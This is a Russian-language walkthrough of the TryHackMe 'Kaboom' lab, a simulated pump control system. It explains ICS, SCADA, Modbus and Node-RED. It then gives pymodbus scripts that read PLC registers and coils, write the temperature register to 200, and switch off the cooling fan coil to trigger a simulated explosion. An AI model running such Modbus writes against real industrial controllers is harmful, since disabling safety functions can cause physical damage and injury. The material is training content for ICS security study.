# Отчет о пентесте машины Kaboom (TryHackMe)

## Введение

Машина **Kaboom** представляет собой симуляцию промышленной системы управления (SCADA/ICS), где цель атакующего — вызвать перегрев и взрыв помпы через манипуляции с Modbus-протоколом. Задание ставит пользователя в роль APT-оператора, который использует Modbus для повышения давления/температуры в системе, вызывая аварию, а затем закрепляется через установку импланта.

* ICS (Industrial Control Systems) — «Промышленные системы управления»
Что это: Это всё железо и софт, которые управляют промышленными процессами.
В ICS входит:

PLC (программируемые логические контроллеры) — мозги станка или помпы.

DCS (распределённые системы управления) — для больших заводов.

RTU (удалённые терминалы) — для управления объектами на расстоянии.

Датчики, исполнительные механизмы, панели оператора.

Пример ICS: Контроллер, который включает и выключает помпу на насосной станции.

* SCADA (Supervisory Control and Data Acquisition) — «Диспетчерское управление и сбор данных»
Что это: Это надстройка над ICS. SCADA — это не железо, а софт, который:

Собирает данные с ICS (температура, давление, статус помпы).

Показывает их оператору на экране (это веб-интерфейс).

Позволяет оператору отправлять команды обратно (включить/выключить, изменить уставку).

Пример SCADA: Открываешь браузер, видишь температуру помпы (55°) и кнопку «Выключить»

### Порт 1880 (Node-RED)

По пути `/ui` отображается панель с показателями помпы в реальном времени.

**WebSocket-соединение:**
Node-RED получает данные от OpenPLC через Modbus и передаёт их в веб-интерфейс по WebSocket от node-red сервера. Сообщение содержит текущее состояние системы:
```
452-["update-value",{"msg":{"payload":{"cooling":false,"explode":false},"input":{"payload":{"unitid":"1","fc":1,"address":"10","quantity":"6"}}}}]
```

Эти данные указывают на то, что **Node-RED взаимодействует с PLC через Modbus**.

**Анализ WebSocket-сообщений:**
- `cooling`: false (вентилятор выключен)
- `explode`: false (взрыв не произошёл)
- `address`: 10 (начальный адрес Modbus)
- `quantity`: 6 (количество читаемых регистров)


## Этап 3: Понимание протоколов и компонентов

### Что такое Modbus

**Modbus** — это промышленный протокол связи, используемый для управления PLC (программируемыми логическими контроллерами). Он работает поверх TCP/IP на порту 502.

В Modbus есть два основных типа данных:

1. **Coils (катушки)** — однобитные значения (`True/False`). Используются для управления дискретными выходами (включить/выключить помпу, вентилятор).
2. **Holding Registers (регистры хранения)** — 16-битные значения (`0–65535`). Используются для хранения числовых параметров (температура, давление, уставки).

**Как это работает в Kaboom:**
- Регистр 0 хранит **температуру** (изначально 55).
- Coil 15 управляет **вентилятором** (True — включён, False — выключен).


### Зачем здесь Node-RED

**Node-RED** — это визуальный инструмент для интеграции IoT и промышленных систем. В Kaboom он используется как **промежуточный слой** между веб-интерфейсом и PLC:

1. Веб-интерфейс на порту 80 показывает состояние помпы.
2. Node-RED на порту 1880 получает данные от PLC через Modbus и отправляет их в веб-интерфейс через WebSocket.
3. При изменении температуры или состояния вентилятора Node-RED обновляет панель управления.


## Этап 4: Modbus-эксплуатация

### 1. Чтение текущего состояния

**Скрипт для чтения holding registers:**
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('10.114.132.28', port=502)
client.connect()
result = client.read_holding_registers(0)  
print(result.registers)
client.close()
```

**Результат:** `[55]` — текущая температура помпы.


### 2. Чтение coils

**Скрипт для чтения coils:**
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('10.114.132.28', port=502)
client.connect()

for i in range(20):
    result = client.read_coils(i)
    if result.bits:
        print(f"Coil {i}: {result.bits[0]}")

client.close()
```

**Результат:**
```
Coil 0: False
Coil 1: False
...
Coil 14: False
Coil 15: True   # вентилятор включён (после перегрева)
Coil 16: False
...
```


### 3. Повышение температуры до 200

**Скрипт для записи в регистр:**
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('10.114.132.28', port=502)
client.connect()

client.write_register(0, 200)

client.close()
```

**Результат:** Температура поднялась до 200. Система включила вентилятор (Coil 15 = True).


### 4. Выключение вентилятора и взрыв

**Скрипт для выключения вентилятора:**
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('10.114.132.28', port=502)
client.connect()

client.write_coil(15, False)

client.close()
```

**Результат:** Вентилятор выключился. Без охлаждения система перегрелась, и произошёл **взрыв**.

После взрыва:
- Видео на порту 80 переключилось в режим `exploded`.
- Появился флаг: `http://10.114.132.28/video?mode=explodedflag23`

1. **Разведка:** Обнаружен открытый порт 502 (Modbus) и порт 1880 (Node-RED) с показателями помпы.
2. **Анализ:** Через Node-RED WebSocket и Modbus-скрипты установлено, что:
   - Holding Register 0 хранит температуру.

3. **Эксплуатация:** Записано значение 200 в Register 0 → температура поднялась, система включила вентилятор.
